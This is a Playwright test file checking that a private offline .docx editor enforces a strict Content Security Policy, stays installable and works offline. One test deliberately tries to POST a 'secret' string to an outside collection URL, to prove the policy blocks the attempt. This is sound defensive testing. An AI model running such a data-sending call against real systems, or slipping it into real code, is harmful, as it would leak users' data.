// The built app enforces the privacy promise and works offline: its Content Security Policy lets it
// load only its own files and connect nowhere, and a service worker keeps its files for offline use.
import { test, expect } from '@playwright/test';
import { buildDocx, openInEditor, download, KITCHEN_SINK } from './helpers.js';
import { CSP } from '../vite.config.js';

/** Collects the page's Content Security Policy violations, from before it loads. */
async function watchViolations(page) {
  await page.addInitScript(() => {
    window.violations = [];
    document.addEventListener('securitypolicyviolation', (e) => window.violations.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  return () => page.evaluate(() => window.violations);
}

test('the page carries the Content Security Policy: its own files only, no connections', async ({ page }) => {
  await page.goto('./');
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toBe(CSP);
  expect(csp).toContain("connect-src 'none'");
  expect(csp).toContain("default-src 'none'");
  expect(csp).not.toMatch(/script-src[^;]*unsafe/);
  await expect(page.locator('meta[name="referrer"]')).toHaveAttribute('content', 'no-referrer');
});

test('a whole editing session breaks no rule of the policy', async ({ page }) => {
  const violations = await watchViolations(page);
  await openInEditor(page, await buildDocx(KITCHEN_SINK));
  await page.locator('.docx-page p').first().click();
  await page.keyboard.type(' Edited');
  await page.getByTitle('Bold (Ctrl+B)').click();
  await download(page);
  await page.goto('./#/about');
  await expect(page.getByRole('heading', { name: 'About' })).toBeVisible();
  expect(await violations()).toEqual([]);
});

test('the page can’t send anything to another site', async ({ page }) => {
  const violations = await watchViolations(page);
  await page.goto('./');
  const outcome = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'secret' });
      return 'sent';
    } catch {
      return 'refused';
    }
  });
  expect(outcome).toBe('refused');
  await expect.poll(violations).toContainEqual(expect.stringMatching(/^connect-src https:\/\/example\.com/));
});

test('the app can be installed: its manifest names it and the files it opens', async ({ page, request }) => {
  await page.goto('./');
  const href = await page.locator('link[rel="manifest"]').getAttribute('href');
  const manifest = await (await request.get(href)).json();
  expect(manifest.name).toBe('Intact — private .docx editor');
  expect(manifest.display).toBe('standalone');
  expect(manifest.file_handlers[0].accept['application/vnd.openxmlformats-officedocument.wordprocessingml.document']).toEqual(['.docx']);
});

test('once opened, the app works offline', async ({ page, context, browserName }) => {
  test.skip(browserName !== 'chromium', 'service workers with offline emulation are checked in Chromium');
  await page.goto('./');
  await page.evaluate(() => navigator.serviceWorker.ready);
  // The service worker's cache holds the app's own files, and nothing else.
  const cached = await page.evaluate(async () => {
    const keys = await caches.keys();
    const cache = await caches.open(keys.find((k) => k.startsWith('intact-')));
    return (await cache.keys()).map((r) => new URL(r.url).pathname);
  });
  expect(cached).toContain('/');
  expect(cached.some((p) => /\/assets\/EditorView-.*\.js$/.test(p))).toBe(true);
  await context.setOffline(true);
  await page.reload();
  await openInEditor(page, await buildDocx('<w:p><w:r><w:t>Offline.</w:t></w:r></w:p>'));
  await expect(page.locator('.docx-page p').first()).toHaveText('Offline.');
  await context.setOffline(false);
});
